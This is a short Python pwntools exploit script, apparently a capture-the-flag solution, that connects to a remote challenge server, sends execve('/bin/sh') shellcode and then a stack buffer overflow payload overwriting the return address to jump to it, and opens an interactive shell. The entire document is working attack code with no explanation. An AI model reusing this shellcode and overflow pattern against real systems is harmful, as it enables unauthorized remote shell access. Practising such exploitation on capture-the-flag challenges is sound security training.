from pwn import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('redirect.do-not-trust.hacking.run', 10025)
address = 0x404070
shellcode = '''
xor rax,rax
xor rdi,rdi
mov rdi ,0x68732f6e69622f
push rdi              
push rsp                 
pop rdi
xor rsi,rsi
xor rdx,rdx
push 0x3b   
pop rax
syscall
'''
print(len(asm(shellcode))) # 30
shellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05'
io.sendline(shellcode)
payload = b'a'*(0x20+0x8)+p64(address)
io.sendline(payload)
io.interactive()